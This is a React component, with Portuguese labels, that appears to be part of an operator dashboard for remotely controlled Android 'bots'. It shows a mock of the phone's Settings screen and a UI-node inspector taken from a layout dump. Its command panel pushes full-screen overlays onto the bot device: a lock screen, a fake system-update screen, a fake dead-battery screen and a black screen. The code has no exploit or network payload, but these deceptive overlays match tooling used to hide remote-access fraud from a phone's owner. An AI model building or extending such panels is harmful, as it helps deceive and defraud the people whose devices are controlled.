import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface LiveScreenProps {
  bot: Bot;
}

export const LiveScreen: React.FC<LiveScreenProps> = ({ bot }) => {
  const [selectedNode, setSelectedNode] = useState<string | null>(null);

  // Nodes extracted from dump.xml
  const screenNodes = [
    { id: '1', title: 'Status Bar', bounds: { left: 0, top: 0, width: 1080, height: 76 }, info: 'class: android.view.View, package: com.android.settings, resource-id: android:id/statusBarBackground' },
    { id: '2', title: 'Samsung Account Profile Card', bounds: { left: 0, top: 934, width: 1080, height: 212 }, info: 'text: Samsung account, class: android.widget.LinearLayout, summary: Profile  •  Security  •  Apps' },
    { id: '3', title: 'Menu Item: Connections', bounds: { left: 0, top: 1198, width: 1080, height: 196 }, info: 'text: Connections, class: android.widget.LinearLayout, summary: Wi-Fi  •  Bluetooth  •  Flight mode' },
    { id: '4', title: 'Menu Item: Sounds and vibration', bounds: { left: 0, top: 1446, width: 1080, height: 196 }, info: 'text: Sounds and vibration, class: android.widget.LinearLayout, summary: Sound mode  •  Ringtone' },
    { id: '5', title: 'Menu Item: Notifications', bounds: { left: 0, top: 1642, width: 1080, height: 196 }, info: 'text: Notifications, class: android.widget.LinearLayout, summary: Status bar  •  Do not disturb' },
    { id: '6', title: 'Menu Item: Display', bounds: { left: 0, top: 1890, width: 1080, height: 196 }, info: 'text: Display, class: android.widget.LinearLayout, summary: Brightness  •  Eye comfort shield' },
    { id: '7', title: 'Search Settings Button', bounds: { left: 956, top: 765, width: 124, height: 147 }, info: 'class: android.widget.Button, content-desc: Search settings' }
  ];

  const handleNodeClick = (info: string) => {
    setSelectedNode(info);
    StorageService.addLog('info', `Clique de nó inspecionado: ${info.split(',')[0]}`, bot.id, bot.name);
  };

  const handleCommand = (state: Bot['screenState']) => {
    StorageService.changeScreenState(bot.id, state);
  };

  // Convert 1080x2198 coordinates to fit inside our responsive scaling container (approx 296x616)
  const scaleX = 296 / 1080;
  const scaleY = 616 / 2198;

  return (
    <div style={{ display: 'flex', gap: '20px', flexWrap: 'wrap', padding: '16px', justifyContent: 'center' }}>
      
      {/* Phone Simulator Frame Wrapper */}
      <div className="android-sim-container">
        <div className="android-sim-device">
          
          {/* Internal Screen Area */}
          <div className="android-sim-screen">
            
            {/* Screen State Overlays */}
            {bot.screenState === 'locked' && (
              <div style={{
                position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.92)', color: 'white',
                display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
                zIndex: 10, padding: '20px', textAlign: 'center', fontFamily: 'sans-serif'
              }}>
                <span style={{ fontSize: '40px', marginBottom: '12px' }}>🔒</span>
                <h4 style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '6px' }}>Aparelho Bloqueado</h4>
                <p style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                  A tela física do celular foi travada pelo painel administrativo.
                </p>
              </div>
            )}

            {bot.screenState === 'black' && (
              <div style={{
                position: 'absolute', inset: 0, background: '#000000', color: '#222',
                display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 10
              }}>
                <span style={{ fontSize: '10px' }}>TELA APAGADA</span>
              </div>
            )}

            {bot.screenState === 'update' && (
              <div style={{
                position: 'absolute', inset: 0, background: '#000000', color: 'white',
                display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
                zIndex: 10, padding: '20px', textAlign: 'center', fontFamily: 'sans-serif'
              }}>
                <div style={{ width: '32px', height: '32px', border: '3px solid rgba(255,255,255,0.2)', borderTopColor: 'var(--accent-purple)', borderRadius: '50%', animation: 'spin 1s linear infinite', marginBottom: '16px' }}></div>
                <h4 style={{ fontSize: '14px', fontWeight: '500', marginBottom: '6px' }}>Instalando atualização...</h4>
                <p style={{ fontSize: '11px', color: '#888' }}>Não desligue o dispositivo ou remova a bateria.</p>
              </div>
            )}

            {bot.screenState === 'battery_dead' && (
              <div style={{
                position: 'absolute', inset: 0, background: '#07070a', color: '#ef4444',
                display: 'flex', flexDirection: 'column', zIndex: 10, justifyContent: 'center', alignItems: 'center',
                padding: '20px', textAlign: 'center', fontFamily: 'sans-serif'
              }}>
                <span style={{ fontSize: '40px', color: '#ef4444', marginBottom: '12px' }}>🪫</span>
                <h4 style={{ fontSize: '15px', fontWeight: 'bold', color: 'white', marginBottom: '6px' }}>Bateria Descarregada</h4>
                <p style={{ fontSize: '11px', color: '#888' }}>Conecte o carregador para ligar o aparelho.</p>
              </div>
            )}

            {/* Base Android Interface Simulation (Settings Layout from dump.xml) */}
            <div style={{ width: '100%', height: '100%', position: 'relative', background: '#f4f5f7', color: '#1f2937', padding: '8px' }}>
              
              {/* Android top bar */}
              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '4px 6px', fontSize: '10px', color: '#6b7280', borderBottom: '1px solid #e5e7eb' }}>
                <span>10:15</span>
                <div style={{ display: 'flex', gap: '4px' }}>
                  <span>📶 5G</span>
                  <span>🔋 {bot.battery}%</span>
                </div>
              </div>

              {/* Title Section */}
              <div style={{ padding: '16px 8px 8px 8px' }}>
                <h3 style={{ fontSize: '20px', fontWeight: '500', color: '#111827' }}>Configurações</h3>
              </div>

              {/* Samsung account mock card */}
              <div style={{ background: 'white', margin: '6px', padding: '10px', borderRadius: '10px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                <div>
                  <div style={{ fontWeight: '600', color: '#111827', fontSize: '12px' }}>Samsung account</div>
                  <div style={{ color: '#6b7280', fontSize: '10px', marginTop: '1px' }}>Profile • Security • Apps</div>
                </div>
                <div style={{ width: '28px', height: '28px', borderRadius: '50%', background: '#e5e7eb' }} />
              </div>

              {/* Settings list scroll list */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', padding: '6px' }}>
                <div style={{ background: 'white', padding: '10px', borderRadius: '10px', display: 'flex', gap: '10px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '14px' }}>📶</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '12px' }}>Conexões</div>
                    <div style={{ fontSize: '9px', color: '#6b7280' }}>Wi-Fi • Bluetooth • Rede Móvel</div>
                  </div>
                </div>

                <div style={{ background: 'white', padding: '10px', borderRadius: '10px', display: 'flex', gap: '10px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '14px' }}>🔊</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '12px' }}>Sons e vibração</div>
                    <div style={{ fontSize: '9px', color: '#6b7280' }}>Modo de som • Toque</div>
                  </div>
                </div>

                <div style={{ background: 'white', padding: '10px', borderRadius: '10px', display: 'flex', gap: '10px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '14px' }}>🔔</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '12px' }}>Notificações</div>
                    <div style={{ fontSize: '9px', color: '#6b7280' }}>Barra de status • Não perturbe</div>
                  </div>
                </div>

                <div style={{ background: 'white', padding: '10px', borderRadius: '10px', display: 'flex', gap: '10px', alignItems: 'center', border: '1px solid #e5e7eb' }}>
                  <span style={{ fontSize: '14px' }}>🖥️</span>
                  <div>
                    <div style={{ fontWeight: '500', fontSize: '12px' }}>Visor</div>
                    <div style={{ fontSize: '9px', color: '#6b7280' }}>Brilho • Proteção ocular</div>
                  </div>
                </div>
              </div>

              {/* Renders invisible node layers overlay for inspection */}
              {screenNodes.map(node => (
                <div
                  key={node.id}
                  className="android-node-highlight"
                  style={{
                    left: `${node.bounds.left * scaleX}px`,
                    top: `${node.bounds.top * scaleY}px`,
                    width: `${node.bounds.width * scaleX}px`,
                    height: `${node.bounds.height * scaleY}px`,
                  }}
                  title={node.title}
                  onClick={() => handleNodeClick(node.info)}
                />
              ))}

            </div>

          </div>

          {/* Home/Back Bottom Buttons Mock */}
          <div style={{ height: '32px', background: '#09090b', display: 'flex', justifyContent: 'space-around', alignItems: 'center', padding: '0 40px' }}>
            <span style={{ color: '#6b7280', fontSize: '12px', cursor: 'pointer' }}>◀</span>
            <span style={{ color: '#6b7280', fontSize: '14px', cursor: 'pointer' }}>●</span>
            <span style={{ color: '#6b7280', fontSize: '10px', cursor: 'pointer' }}>■</span>
          </div>

        </div>
      </div>

      {/* Side Command controls panel */}
      <div style={{ flex: '1 1 300px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
        
        {/* Node inspector panel */}
        <div className="glass-panel" style={{ padding: '16px' }}>
          <h4 style={{ fontSize: '15px', fontWeight: '600', marginBottom: '8px' }}>Inspecionador de Layout</h4>
          {selectedNode ? (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <div style={{ background: 'var(--bg-primary)', padding: '10px', borderRadius: '6px', fontSize: '12px', fontFamily: 'var(--font-mono)', border: '1px solid var(--border-color)', wordBreak: 'break-all' }}>
                {selectedNode}
              </div>
              <button className="btn btn-secondary" onClick={() => setSelectedNode(null)} style={{ alignSelf: 'flex-end', padding: '2px 8px', fontSize: '11px', minHeight: '28px' }}>
                Limpar
              </button>
            </div>
          ) : (
            <p style={{ color: 'var(--text-muted)', fontSize: '12px' }}>Clique em qualquer caixa azul na tela do celular simulada para ver suas propriedades XML.</p>
          )}
        </div>

        {/* Command buttons overlay tool */}
        <div className="glass-panel" style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
          <h4 style={{ fontSize: '15px', fontWeight: '600' }}>Telas de Bloqueio & Overlays</h4>
          <p style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Altere o estado de renderização na tela do bot:</p>
          
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginTop: '4px' }}>
            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'locked' ? 'unlocked' : 'locked')}
              style={{
                background: bot.screenState === 'locked' ? 'var(--danger)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'locked' ? 'var(--danger)' : 'var(--border-color)',
                color: 'white',
                padding: '8px',
                fontSize: '12px'
              }}
            >
              {bot.screenState === 'locked' ? '🔓 Destravar' : '🔒 Travar'}
            </button>

            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'update' ? 'unlocked' : 'update')}
              style={{
                background: bot.screenState === 'update' ? 'var(--accent-purple)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'update' ? 'var(--accent-purple)' : 'var(--border-color)',
                color: 'white',
                padding: '8px',
                fontSize: '12px'
              }}
            >
              🔄 Upd System
            </button>

            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'battery_dead' ? 'unlocked' : 'battery_dead')}
              style={{
                background: bot.screenState === 'battery_dead' ? 'var(--warning)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'battery_dead' ? 'var(--warning)' : 'var(--border-color)',
                color: 'white',
                padding: '8px',
                fontSize: '12px'
              }}
            >
              🪫 Bateria Morta
            </button>

            <button 
              className="btn btn-secondary"
              onClick={() => handleCommand(bot.screenState === 'black' ? 'unlocked' : 'black')}
              style={{
                background: bot.screenState === 'black' ? 'var(--text-primary)' : 'var(--bg-tertiary)',
                borderColor: bot.screenState === 'black' ? 'var(--text-primary)' : 'var(--border-color)',
                color: bot.screenState === 'black' ? 'black' : 'white',
                padding: '8px',
                fontSize: '12px'
              }}
            >
              🕶️ Apagar Tela
            </button>
          </div>
          
          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '8px', marginTop: '4px', fontSize: '11px', color: 'var(--text-muted)' }}>
            Tela do dispositivo: <strong style={{ color: 'var(--text-primary)' }}>{bot.screenState.toUpperCase()}</strong>
          </div>
        </div>

      </div>

    </div>
  );
};
